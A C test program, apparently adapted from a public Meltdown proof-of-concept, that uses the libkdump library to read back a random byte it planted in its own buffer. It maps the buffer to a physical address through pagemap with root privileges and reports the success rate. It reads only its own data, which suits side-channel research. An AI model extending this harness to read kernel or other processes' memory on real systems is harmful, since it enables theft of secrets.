#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>    // Fixed: Added for time()

int main(int argc, char *argv[]) {
  libkdump_config_t config; 
  memset(&config, 0, sizeof(libkdump_config_t));

  config.cache_miss_threshold = 100; 
  config.measurements = 10;
  config.physical_offset = 0x80000000;

  if (libkdump_init(config) != 0) {
    return -1;
  }

  // Fixed: Define missing variables
  char scratch[4096]; 
  char secret = (rand() % 255) + 1;
  size_t progress = 0; 
  
  size_t var = (size_t)(scratch + 2048);
  *(char*)var = secret;

  // Verify memory mapping for FZ3 board
  size_t start = libkdump_virt_to_phys(var);
  if (!start) {
    printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    exit(1);
  }
  
  srand(time(NULL));

  size_t correct = 0, wrong = 0, failcounter = 0;
  // Use the physical address for the Meltdown-style read
  size_t phys = start; 

  while (1) {
    *(volatile unsigned char*)var = secret;

    int res = libkdump_read(phys);
    if (res == secret) {
      correct++;
    } else if(res != 0) {
      wrong++;
    } else {
      failcounter++;
      if(failcounter < 1000) {
        continue;
      } else {
        failcounter = 0;
        wrong++;
      }
    }
    // Fixed: Progress variable now declared
    printf("\r\x1b[34;1m[%c]\x1b[0m Success rate: %.2f%% (read %zd values)    ", "/-\\|"[(progress++ / 100) % 4], (100.f * (double)correct) / (double)(correct + wrong + 1e-9), correct + wrong);
    fflush(stdout);
    secret = (rand() % 255) + 1;
  }

  libkdump_cleanup();
  return 0;
}